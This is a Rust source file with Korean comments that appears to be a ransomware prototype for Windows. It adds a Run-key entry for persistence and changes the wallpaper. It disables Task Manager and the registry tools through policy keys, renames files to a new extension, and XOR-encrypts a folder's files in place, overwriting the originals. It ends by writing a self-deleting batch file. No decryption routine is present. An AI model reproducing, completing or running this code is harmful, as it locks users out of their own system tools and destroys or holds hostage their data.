use std::io;
use std::fs;
use std::path::Path;
use winreg::RegKey;
use winreg::enums::*;
use std::fs::File;
use std::io::Write;
use std::process::Command;
use std::path::PathBuf;
use std::io::Read;

fn add_registry_value() -> io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion").join("Run");
    let (_key, _disp) = hkcu.create_subkey(&path)?;

    _key.set_value("ThisIsLoki", &"C:\\Users\\brady\\VScode\\rust\\LokiLoki.exe")?;

    Ok(())
}

fn set_wallpaper() -> io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Control Panel\\Desktop");
    let (_key, _disp) = hkcu.create_subkey(&path)?;

    println!("{}", path.display());

    _key.set_value("WallPaper", &"C:\\Windows\\Web\\Wallpaper\\Windows\\test.jpg")?;

    Ok(())
}


fn disable_ver() -> io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER); //작업 관리자 설정 가능한 레지스터리 키

    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies").join("System"); // 하위 키 System 생성 경로 정의
    let (_key, _disp) = hkcu.create_subkey(&path)?; //지정된 경로 삽입 후 하위 키 System 생성

    let (_key2, _disp2) = hkcu.create_subkey(&path)?; 

    _key.set_value("DisableTaskMgr", &1u32)?; // DisableTaskMgr라는 이름의 Dword (32bit) 값 생성 후 1로 설정 
    _key2.set_value("DisableRegistryTools", &1u32)?; //DisableRegistryToools라는 이름의 Dword (32bit) 값 생성 후 1로 설정

    Ok(())
}

fn kill() -> io::Result<()> {
    // batch 파일명
    let killer = "killfile.bat";
    // 실행 파일명
    let this_file = "C:\\Users\\test\\Desktop\\test_pro.exe";
    let sz_bat_file = format!(
        ":Repeat      \r\n\
         del /f /s /q {}    \r\n\
         if exist \"{}\" goto Repeat \r\n\
         del /s /q {}     \r\n",
        this_file, this_file, killer
    );

    // batch 파일을 생성합니다.
    let mut fp = File::create(killer)?;
    fp.write_all(sz_bat_file.as_bytes())?;

    let _status = Command::new("open")
        .args(&[killer])
        .status();

    Ok(())
}

// 확장자 변경하는 함수
fn change_extension(dir_path: &str, new_extension: &str) -> Result<(), std::io::Error> {
    let entries = fs::read_dir(dir_path)?;          // 폴더 내 파일을 읽어옴

    for entry in entries {
        let entry = entry?;             //결과를 생성하기 위해 프로세스의 반복
        let old_path = entry.path();    // 현재 파일의 경로를 가져옴

        if let Some(file_name) = old_path.file_name() {     // old_path에서 파일 이름을 추출, 있으면 실행
                                                            // 추출되면 Some(파일 이름) 형태로 반환
                                                            // 즉 반환 값이 Some이면 실행 
            let new_file_name = format!(
                "{}.{}",
                file_name.to_string_lossy().split('.').next().unwrap(), new_extension
                // file_name.to_string_lossy() 문자열로 변환
                // split() 파일 이름을 .을 기준으로 분리
                // next().unwrap() 분리된 파일 이름의 첫 부분을 가져옴
                // new_extension 새로운 확장자
            );

            let new_path = old_path.with_file_name(new_file_name);  // 기존 경로에 새로운 파일 이름을 적용, 새로운 파일 경로 생성
            fs::rename(old_path, new_path)?;        // rename 함수 사용하여 파일 이름 변경
        }
    }

    Ok(())
}


//* 디렉토리에서 파일 명 가져오는 함수 *//
fn call_filePath() -> Vec<PathBuf>{
    //파일 구조 가져오기
    let dir_path = "C:\\Users\\guswj\\OneDrive\\바탕 화면\\rust\\crypto_test"; //암호화 시킬 디렉토리 경로
    let mut dir_path_list = Vec::new(); //파일 경로들 담을 리스트 생성

    if let Ok(entries) = fs::read_dir(dir_path) {    // 함수를 사용해 부모 디렉토리 경로에서 자식 디렉토리명과 파일명을 구함
        for entry in entries{
            if let Ok(entry) = entry {
                let path = entry.path();
                println!("{}", path.display()); //check
                dir_path_list.push(path);
            }
        }
    }
    else {
        println!("위치 불러오기 실패");
    }
    println!("{:?}", dir_path_list); //check
    return dir_path_list;
}


//* 파일 HEX값 10진수로 가져오는 함수 *//
fn read_binary_file(file_path: &str) -> io::Result<Vec<u8>> {
    // 파일을 읽기 모드로 열기
    let mut file = File::open(file_path)?;

    // 파일의 크기를 구하여 버퍼를 할당
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    Ok(buffer)
}

fn encode_file() {
    let key = 123;//암호화 키 설정
    
    let file_path = call_filePath();//파일 경로 불러오기

    for one_file_path in file_path{ //리스트에서 파일경로 하나씩 꺼내오기
        if let Some(put_file_path) = one_file_path.to_str() { //PathBuf타입을 str타입으로 변환
            let mut crypto_data = Vec::new();// 암호화한 데이터 담을 빈 리스트 생성
            println!("Success"); //check

            match read_binary_file(put_file_path) {
                Ok(data) => {
                    // 데이터 처리
                    println!("읽은 데이터: {:?}", data); //check
        
                    for buf in data{
                        let mut crypto_buf = buf^key; //xor암호화
                        crypto_data.push(crypto_buf);
                    }
                }
                Err(e) => {
                    println!("파일 읽기 오류: {}", e);
                }
            }

            println!("crypto data : {:?}",crypto_data); //check

            //파일 생성하여 원본파일을 암호화된 파일로 덮어쓰기
            let mut crypto_file = File::create(put_file_path).expect("파일 생성 실패...");
            crypto_file.write_all(&crypto_data).expect("쓰기 실패");

            println!("암호화 실행 완료");

        } else {
            println!("failed");
        }
    }
}

fn main() -> io::Result<()> {
	let dir_path = "C:\\test";                                         //변경할 폴더
    let new_extension = "12";                                         //원하는 파일 확장자

    add_registry_value()?;
	set_wallpaper()?;
	disable_ver()?;
    change_extension(dir_path, new_extension)?;
	encode_file();
    kill()?;

    Ok(())
}